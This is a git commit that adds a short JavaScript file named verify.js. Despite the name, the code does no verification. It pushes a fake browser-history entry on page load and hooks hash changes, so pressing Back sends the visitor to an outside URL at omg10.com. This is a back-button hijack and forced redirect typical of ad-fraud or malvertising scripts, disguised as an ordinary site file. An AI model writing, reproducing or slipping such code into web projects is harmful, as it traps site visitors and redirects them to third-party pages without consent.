c8016bbdd0749b8d250efafa7019072a403b8a4d
ztainz <johnsonmfon09@gmail.com>
2026-07-19 06:18:37 -0700

    Create verify.js

---
+++ verify.js
@@ -0,0 +1,11 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://omg10.com/4/11196136";
+    }
+    function goon(){
+        location.href="https://omg10.com/4/11196136";
+    }
